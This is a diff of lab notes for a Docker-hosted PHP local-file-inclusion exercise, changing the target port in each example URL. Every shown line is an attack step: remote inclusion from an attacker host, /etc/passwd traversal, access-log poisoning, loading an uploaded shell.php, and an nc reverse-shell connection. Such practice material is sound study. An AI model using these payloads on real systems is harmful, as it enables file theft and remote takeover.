@@ -2,15 +2,15 @@
 
 ## PHP
 
-- http://127.0.0.1:4353/lfi.php?language=http://172.18.0.3/check.php?
+- http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?
 
 see `allow_url_include` in response
 
-- http://127.0.0.1:4353/lfi.php?page=/etc/passwd
+- http://127.0.0.1:8883/lfi.php?page=/etc/passwd
 
 - By Experiment add ../ since before etc/passwd until:
 
-http://127.0.0.1:4353/lfi.php?page=../../../etc/passwd
+http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd
 
 - Get "access.log", changed here to "access_combined.log" because stdout is going out of docker:
 
@@ -23,10 +23,10 @@ http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&
 
 - Upload check.php from attacker-server src folder
 load
-http://127.0.0.1:4353/lfi.php?language=/var/www/html/uploads/check
+http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check
 
 - upload shell.php
-http://127.0.0.1:4353/lfi.php?language=/var/www/html/uploads/shell
+http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell
 docker exec -ti <containerid_attackerserver> /bin/bash
 nc 172.18.0.1 4444
 
